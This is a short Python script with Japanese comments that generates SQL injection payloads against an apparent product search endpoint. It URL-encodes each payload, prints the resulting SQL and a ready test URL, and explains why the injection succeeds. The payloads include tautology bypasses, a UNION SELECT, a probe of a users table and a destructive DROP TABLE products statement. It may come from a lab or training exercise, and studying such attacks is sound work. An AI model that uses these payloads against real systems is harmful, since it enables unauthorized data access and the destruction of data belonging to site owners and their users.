import urllib.parse

# 正しいペイロード例
correct_payloads = [
    "test' OR 1=1 --",
    "test' OR '1'='1' --", 
    "test' UNION SELECT 1,2,3,4,5,6,7 --",
    "test' OR (SELECT COUNT(*) FROM users) > 0 --",
    "'; DROP TABLE products; --"
]

query_template = "SELECT id, name, description, price, stock, category, image_url FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"

print("=== 正しいSQLインジェクションペイロード ===")

for i, payload in enumerate(correct_payloads, 1):
    sql = query_template.format(query=payload)
    encoded = urllib.parse.quote(payload)
    
    print(f"\n[{i}] ペイロード: {payload}")
    print(f"URLエンコード: {encoded}")
    print(f"生成SQL: {sql}")
    print(f"テストURL: /search?q={encoded}")
    print("-" * 60)

print("\n=== なぜうまくいくのか ===")
print("1. シングルクォートで最初のLIKE文字列を適切に閉じる")
print("2. OR で新しい条件を追加")  
print("3. -- で残りの部分をコメントアウト")
print("4. 結果的に WHERE name LIKE '%test' OR 1=1 という構造になる")